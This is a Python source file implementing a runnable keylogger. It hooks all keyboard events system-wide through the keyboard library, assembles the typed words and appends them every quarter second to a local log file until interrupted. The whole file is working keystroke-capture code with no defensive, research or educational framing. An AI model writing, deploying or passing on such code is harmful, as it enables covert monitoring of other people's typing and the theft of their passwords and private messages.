import keyboard
import time
import datetime
import sys
import threading
import random

class Keylogger:
    def __init__(self, name):
        self.log = ''
        self.start_time = None
        self.current_word = ''
        self.current_key = None
        self.current_window = None
        self.running = False
        self.paused = False
        self.file_name = name
        self.output_file = None
        self.update_time = 0.25
        self.output_time = 5
        

    def callback(self, event):
        if self.paused:
            return

        if event.event_type == keyboard.KEY_DOWN:
            if len(self.current_word) == 0:
                self.start_time = time.time()

            if event.name not in ['space', 'enter', 'esc', 'tab', 'backspace', 'delete', 'shift']:
                self.current_word += event.name
            else:
                if len(self.current_word) > 0:
                    self.log += self.current_word + ' '
                    self.current_word = ''

        if event.event_type == keyboard.KEY_UP:
            self.current_key = None

    def write_log(self):
        if len(self.log) > 0:
            self.output_file.write(self.log)
            self.output_file.flush()
            self.log = ''

    def start(self):
        if self.running:
            return

        self.running = True
        self.output_file = open(self.file_name, 'a')
        keyboard.on_press(self.callback)
        keyboard.on_release(self.callback)
        self.update_timer = threading.Timer(self.update_time, self.update)
        self.update_timer.start()

    def pause(self):
        self.paused = not self.paused

    def update(self):
        self.write_log()
        self.update_timer = threading.Timer(self.update_time, self.update)
        self.update_timer.start()

    def stop(self):
        if not self.running:
            return

        self.paused = False
        self.running = False
        self.update_timer.cancel()
        keyboard.unhook_all()
        self.write_log()
        self.output_file.close()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        name = sys.argv[1]
    else:
        name = 'log.txt'

    logger = Keylogger(name)
    logger.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.stop()
    